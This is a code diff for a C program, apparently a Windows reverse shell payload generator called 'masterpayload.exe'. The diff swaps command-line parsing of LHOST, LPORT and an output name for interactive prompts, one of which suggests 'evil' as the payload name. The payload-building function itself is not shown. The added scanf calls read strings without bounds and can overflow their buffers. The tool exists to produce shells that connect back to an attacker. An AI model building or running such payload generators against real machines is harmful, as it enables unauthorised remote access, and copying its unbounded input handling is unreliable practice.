@@ -7,7 +7,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 void usage() {
-    printf("Usage: masterpayload.exe LHOST=(IP) LPORT=(port) --write name\n");
+    printf("Usage: Enter LHOST and LPORT to generate the payload.\n");
 }
 
 void generate_payload(const char *lhost, const char *lport, const char *output_file) {
@@ -53,61 +53,24 @@ void generate_payload(const char *lhost, const char *lport, const char *output_f
     printf("[*] Payload generován! S LHOSTEM %s a LPORTEM %s, saved as %s\n", lhost, lport, final_filename);
 }
 
-int main(int argc, char *argv[]) {
-    if (argc < 5) {
-        usage();
-        return 1;
-    }
+int main() {
+    char lhost[256], lport[10], output_file[256];
 
-    char *lhost = NULL, *lport = NULL, *output_file = NULL;
+    // Display usage instructions
+    usage();
 
-    // Debugging: Print all arguments to check their structure
-    printf("Arguments received:\n");
-    for (int i = 0; i < argc; i++) {
-        printf("  %d: %s\n", i, argv[i]);
-    }
+    // Ask the user for LHOST, LPORT, and output filename
+    printf("Enter LHOST (IP address): ");
+    scanf("%s", lhost);
 
-    for (int i = 1; i < argc; i++) {
-        if (strncmp(argv[i], "LHOST=", 6) == 0) {
-            lhost = argv[i] + 6;  // Extract IP from argument
-        } else if (strncmp(argv[i], "LPORT=", 6) == 0) {
-            lport = argv[i] + 6;  // Extract port from argument
-        } else if (strncmp(argv[i], "--write", 7) == 0) {
-            // Handle --write argument by checking the next argument
-            if (i + 1 < argc) {
-                output_file = argv[i + 1];  // Get the filename from the next argument
-                break; // exit after we find the filename for --write
-            } else {
-                usage();
-                return 1;
-            }
-        }
-    }
+    printf("Enter LPORT (Port number): ");
+    scanf("%s", lport);
 
-    // Check if any arguments are missing
-    if (lhost == NULL || lport == NULL || output_file == NULL) {
-        usage();
-        return 1;
-    }
+    printf("Enter the name for the payload (e.g., evil): ");
+    scanf("%s", output_file);
 
-    // Debugging: Print parsed arguments
-    printf("Parsed Arguments:\n");
-    printf("LHOST: %s\n", lhost);
-    printf("LPORT: %s\n", lport);
-    printf("Output File: %s\n", output_file);
-
-    // Initialize Winsock
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        printf("WSAStartup failed with error %d\n", WSAGetLastError());
-        return 1;
-    }
-
-    // Generate the reverse shell payload
+    // Generate the payload
     generate_payload(lhost, lport, output_file);
-
-    // Cleanup Winsock
-    WSACleanup();
 
     return 0;
 }
